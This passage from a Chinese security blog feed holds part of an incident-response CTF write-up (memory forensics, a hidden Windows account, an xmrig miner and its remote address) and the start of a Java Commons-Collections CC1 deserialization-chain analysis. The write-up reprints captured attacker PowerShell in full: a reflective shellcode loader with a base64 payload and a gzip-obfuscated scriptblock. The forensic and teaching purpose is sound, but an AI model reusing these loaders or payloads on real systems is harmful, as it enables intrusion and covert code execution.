显示了当前进程与其父进程的关系。操作系统使用 PPID 来管理进程之间的层级关系，当一个进程退出时，它的子进程可能会被重新分配给另一个父进程（通常是 <code>init</code> 进程）。</li><li><strong>示例</strong>：假设进程 PID 为 1234 的进程是由 PID 为 5678 的进程启动的，那么进程 1234 的 PPID 就是 5678。</li></ul><p>但是这里两个试了都不行</p><p>后来才知道</p><p><strong>UTC+0000</strong> 是一种表示时间偏移量的格式，用于说明某个时间与协调世界时（UTC，Universal Time Coordinated）的关系。</p><p><strong>UTC+0000</strong> 表示没有时间偏移的协调世界时，常用于不受时区影响的场合。</p><p>中国使用的时区是 <strong>中国标准时间（CST）</strong>，也被称为 <strong>北京时间</strong>。其时区偏移量是 <strong>UTC+08:00</strong>，也就是说，中国的时间比协调世界时（UTC）快 8 小时。</p><p>所以要加8小时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong></p><p>我们在filescan文件中可以找到Windows日志文件Security.evtx，<strong>注意大写</strong></p><p><code>security.evtx</code> 是 Windows 操作系统中的一个事件日志文件，主要记录与系统安全相关的事件信息。它是 Windows 日志文件的一部分，用于存储关于用户登录、账户管理、安全审计、系统访问控制等事件的数据。</p><p>攻击者利用跳板rdp登录受害机，那么windows日志肯定会有相关记录。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113321749.png" class="" title="图片引用方法一"><p>我们把它dump下来</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113401080.png" class="" title="图片引用方法一"><p>dump下来后缀改成evtx就行，然后放到宝瓜分析！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113532493.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113556890.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-6"><a href="#内存取证-6" class="headerlink" title="内存取证-6"></a>内存取证-6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者创建的用户的密码哈希值</span><br><span class="line">flag格式 flag&#123;XXXX&#125;</span><br></pre></td></tr></table></figure><p>创建的用户是ASP.NET</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229122231066.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5ffe97489cbec1e08d0c6339ec39416d&#125;</span><br></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>这里我们先获取虚拟机administrator用户的密码</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132342981.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132335459.png" class="" title="图片引用方法一"><h3 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库-1"></a>数据库-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到攻击者创建隐藏账户的时间</span><br><span class="line">flag格式 如 flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure><p>给了vmdk和ovf，可以用vmware打开和取证</p><p><strong>VMDK</strong> 是一种文件后缀，代表 <strong>Virtual Machine Disk</strong>，是一种虚拟磁盘文件格式。它由 VMware 开发，用于存储虚拟机的硬盘内容</p><p>先打开看看，发现需要密码，那么！取证大师！启动！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229130911566.png" class="" title="图片引用方法一"><p>在 Windows 中，账户名以 <strong><code>$</code></strong> 结尾的通常表示隐藏的共享或资源。</p><p>只有一个test$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;test$&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229131325621.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2024-12-16 15:24:21</span><br></pre></td></tr></table></figure><p>密码设置时间很有可能就是创建用户的时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/16 15:24:21&#125;</span><br></pre></td></tr></table></figure><p>不仅取证大师可以发现隐藏用户，这里也可以compmgmt.msc</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132651247.png" class="" title="图片引用方法一"><h3 id="数据库-2"><a href="#数据库-2" class="headerlink" title="数据库-2"></a>数据库-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到恶意文件的名称</span><br><span class="line">flag格式 如 flag&#123;*.*&#125;</span><br></pre></td></tr></table></figure><p>上传火绒剑分析</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229133350472.png" class="" title="图片引用方法一"><p>发现c盘java目录下有一个xmrig.exe，有远程地址和本地地址的连接，猜测是恶意后门文件！</p><p>百度一下看看</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229133446413.png" class="" title="图片引用方法一"><p>塌房了！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xmrig.exe&#125;</span><br></pre></td></tr></table></figure><h3 id="数据库-3"><a href="#数据库-3" class="headerlink" title="数据库-3"></a>数据库-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到恶意文件的外联地址</span><br><span class="line">flag格式 如 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>外链地址，简单，上面有了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.107.45.167:3333</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;203.107.45.167&#125;</span><br></pre></td></tr></table></figure><h3 id="数据库-4"><a href="#数据库-4" class="headerlink" title="数据库-4"></a>数据库-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请修复数据库</span><br><span class="line">flag格式 如 flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure><p>修复数据库？？？</p><h3 id="数据库-5"><a href="#数据库-5" class="headerlink" title="数据库-5"></a>数据库-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请提交powershell命令中恶意文件的MD5</span><br><span class="line">flag格式 如 flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure><p>powershell命令，看日志</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229134458850.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229134531627.png" class="" title="图片引用方法一"><p>发现存在大量远程命令执行，我们逐个分析</p><p>在后面几个发现了比较特殊的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText function tWk &#123; Param ($k0M, $ybp) $f2w = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;) return $f2w.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($f2w.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($k0M)))), $ybp)) &#125; function lVhI5 &#123; Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $v8K8, [Parameter(Position = 1)] [Type] $nZWM = [Void] ) $p8dl = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate]) $p8dl.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) $p8dl.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $nZWM, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) return $p8dl.CreateType() &#125; [Byte[]]$tUZml = [System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;) [Uint32]$uKrz = 0 $rS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualAlloc), (lVhI5 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tUZml.Length,0x3000, 0x04) [System.Runtime.InteropServices.Marshal]::Copy($tUZml, 0, $rS, $tUZml.length) if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualProtect), (lVhI5 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($rS, [Uint32]$tUZml.Length, 0x10, [Ref]$uKrz)) -eq $true) &#123; $yfm6I = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll CreateThread), (lVhI5 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$rS,[IntPtr]::Zero,0,[IntPtr]::Zero) [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll WaitForSingleObject), (lVhI5 @([IntPtr], [Int32]))).Invoke($yfm6I,0xffffffff) | Out-Null &#125;  </span><br><span class="line">  ScriptBlockId 6272cc91-9ab4-4901-8088-ca946f7ae722 </span><br><span class="line">  Path  </span><br></pre></td></tr></table></figure><p>关注此处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((&#x27;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&#123;0&#125;&#x27;)-f&#x27;A&#x27;,&#x27;f&#x27;,&#x27;M&#x27;)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) </span><br><span class="line">  ScriptBlockId 5ef6ec2a-3ad1-4051-8fba-a804b7bddefb </span><br><span class="line">  Path  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>稍微问一下AI</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229135320255.png" class="" title="图片引用方法一"><p>其实自己也看得出来，其中的关键VirtualProtect，Invoke，kernel32.dll其实可以猜出来，相当于免杀的混淆，base64解码后执行shellcode。</p><p>同时也发现了System.IO.Compression.GzipStream</p><p>根据时间判断，应该是先gz压缩，再base64</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229135841104.png" class="" title="图片引用方法一"><p>导出看看</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229140034813.png" class="" title="图片引用方法一"><p>导出为bin文件然后丢微步之类的看看。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229140152237.png" class="" title="图片引用方法一"><p>恶意文件实锤了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d72000ee7388d7d58960db277a91cc40&#125;</span><br></pre></td></tr></table></figure><h2 id="综合应急"><a href="#综合应急" class="headerlink" title="综合应急"></a>综合应急</h2><h3 id="综合应急-1"><a href="#综合应急-1" class="headerlink" title="综合应急-1"></a>综合应急-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：FOG日志</span><br><span class="line">综合应急-1请点击左上角“CTF”按钮切换为“知识竞赛”进行答题。题目类型为选择题，提交机会只有一次，请慎重提交。</span><br><span class="line">本题 flag答案为flag&#123;solar&#125;</span><br></pre></td></tr></table></figure><h3 id="综合应急-2"><a href="#综合应急-2" class="headerlink" title="综合应急-2"></a>综合应急-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：FOG日志</span><br><span class="line">攻击者上传了代理工具，请写出他的最终存放路径</span><br><span class="line">格式为flag&#123;x:\xxxxx\xxxx\xxxxxx&#125;</span><br></pre></td></tr></table></figure><p>FOG 是一个用于部署计算机镜像的管理工具，特别是在网络中快速部署操作系统和应用程序。通过 FOG，管理员可以对计算机进行远程安装、恢复和管理。这对于大规模部署、维护和备份计算机非常有用。</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化CC1链分析</title>
      <link href="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1链-分析"><a href="#CC1链-分析" class="headerlink" title="CC1链 分析"></a>CC1链 分析</h1><p><strong>环境要求：jdk8u65，Commons-Collections 3.2.1</strong></p><ul><li>首先我们再次明确一下反序列化的攻击思路。</li></ul><p>入口类这里，我们需要一个 <code>readObject</code> 方法，结尾这里需要一个能够命令执行的方法。我们中间通过链子引导过去。所以我们的攻击一定是从尾部出发去寻找头的，流程图如下。</p><img src="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/AttackRoad.png" alt="img" style="zoom:80%;" /><p><strong>Common-Collections介绍</strong></p><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><ul><li>简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 <code>Collections API</code> 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。</li></ul><h2 id="终点-利用点"><a href="#终点-利用点" class="headerlink" title="终点-利用点"></a>终点-利用点</h2><p>CC1链的源头就是Commons Collections库中的Tranformer接口，这个接口里面有个transform方法。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20250320183824505.png" class="" title="This is an example image"><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105194118934.png" class="" title="This is an example image"><p>快捷键ctrl+alt+B，查看实现接口的类</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105194436449.png" class="" title="This is an example image"><p>我们这里找到了有重写transform方法的InvokerTransformer类，并且可以看到它也继承了Serializable,很符合我们的要求。</p><p>下面给出InvokerTransformer类的构造器和重写的transform方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The method name to call */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="comment">/** The array of reflection parameter types */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="comment">/** The array of reflection arguments */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = <span class="literal">null</span>;</span><br><span class="line">        iArgs = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method 